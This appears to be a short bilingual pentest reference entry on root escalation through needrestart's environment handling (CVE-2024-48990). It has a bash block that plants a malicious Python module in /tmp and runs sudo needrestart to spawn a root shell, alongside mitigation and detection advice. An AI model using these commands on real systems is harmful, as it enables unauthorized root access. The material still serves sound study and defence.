---
topic: needrestart privilege escalation
tags: [linux, needrestart, cve-2024-48990, sudo, pythonpath, privesc]
---

# needrestart privilege escalation

**English** | [🇪🇸 Español](needrestart-privesc.md)

## Concept

`needrestart` detects services that must be restarted after an update. In affected versions it loads Python modules from the environment and evaluates configuration as Perl (CVE-2024-48990 and related). If a user can run it through `sudo`, they can plant a module in `/tmp` and execute code as root.

## When it applies

- A `sudo` rule for `needrestart`.
- An old package version.
- An unsanitized `PYTHONPATH`.
- A user-writable directory.

## Procedure

1. Review `sudo -l`.
2. Confirm the `needrestart` version.
3. Identify the module it imports from the environment.
4. Create the malicious module in a controlled directory.
5. Run `sudo needrestart` and check for a shell.

```bash
sudo -l
needrestart --version
printf 'import os\nos.setuid(0)\nos.system("/bin/sh")\n' > /tmp/importlib.py
sudo PYTHONPATH=/tmp needrestart
```

## Variants

- CVE-2024-48990 through `PYTHONPATH`.
- CVE-2024-48991 and CVE-2024-48992 through other interpreters or configurations.
- Abusing a writable configuration directory.
- Execution through a wrapper or scheduled task.

## Limitations

- The `sudo` rule must allow the binary.
- The fixed version sanitizes the environment.
- The module must have the exact name being imported.
- The user must be able to write to the directory in use.

## Mitigation and detection

- Update `needrestart`.
- Do not grant `sudo needrestart` to non-admin users.
- Sanitize `PYTHONPATH`, `PERL5LIB` and equivalent variables.
- Audit `sudo` executions, imports from `/tmp` and configuration changes.

## References

- <https://nvd.nist.gov/vuln/detail/CVE-2024-48990>
- <https://ubuntu.com/security/CVE-2024-48990>
- <https://attack.mitre.org/techniques/T1574/007/>
